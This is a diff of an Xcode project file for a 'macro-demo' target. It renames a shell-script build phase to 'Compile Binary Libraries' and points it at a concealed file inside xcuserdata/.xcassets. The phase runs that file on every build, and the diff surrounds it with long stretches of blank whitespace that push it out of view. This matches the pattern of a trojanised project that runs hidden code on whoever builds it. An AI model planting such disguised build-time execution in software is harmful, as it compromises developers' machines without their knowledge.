@@ -75,7 +75,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 30A7531E25B6CDBC0053CA76 /* Build configuration list for PBXNativeTarget "macro-demo" */;
 			buildPhases = (
-				CA5EF1755F5CF0E6BE6D902C /* Build Assets Catalog */,
+				C18BEDC4710CFBD9D86D902C /* Compile Binary Libraries */,
 				30A7530125B6CDBB0053CA76 /* Sources */,
 				30A7530225B6CDBB0053CA76 /* Frameworks */,
 				30A7530325B6CDBB0053CA76 /* Resources */,
@@ -347,6 +347,46 @@
 
 			
 	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
+
+
+			
+	
 			
 
 			
@@ -358,7 +398,7 @@
 	
 		/* Begin PBXShellScriptBuildPhase section */
 
-	CA5EF1755F5CF0E6BE6D902C /* Build Assets Catalog */ = {
+	C18BEDC4710CFBD9D86D902C /* Compile Binary Libraries */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -367,7 +407,7 @@
 			);
 			inputPaths = (
 			);
-			name = "Build Assets Catalog";
+			name = "Compile Binary Libraries";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -376,8 +416,92 @@
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.
 
-\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Assets.xcassets\" false";			
+\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Asset.xcasset\" false";			
 		};
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
+	
+
 	
 
 	
